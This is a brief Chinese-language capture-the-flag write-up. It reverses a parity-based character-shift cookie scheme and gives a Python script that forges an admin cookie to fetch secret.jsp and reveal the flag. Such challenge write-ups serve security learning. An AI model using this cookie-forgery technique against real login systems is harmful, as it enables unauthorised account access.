cookie看起来是随机的，但是仔细分析就可以发现每次登录改变的只有偶数位的字符，奇数位的不变，如登录用户`abc`，得到cookie`_wd3ab`

```
a = _ + 2
b = d - 2
c = a + 2
```

cookie的加密逻辑也就是逐位判断奇偶，然后加上一个随机字符，最后脚本如下

```python
import requests

def encrypt(s):
    res = ""
    for i in s:
        if ord(i)%2 == 0:
            res += chr(ord(i) + 2)
        else:
            res += chr(ord(i) - 2)
        res += "a"
    return res

def main():
    url = "" + "secret.jsp"
    cookies = {"usr" : encrypt("admin")}
    res = requests.get(url, cookies=cookies)
    print(res.text[15:43])

if __name__ == "__main__":
    main()
```
得到flag
```
flag{you_f1nd_adm1n_3ecret!}
```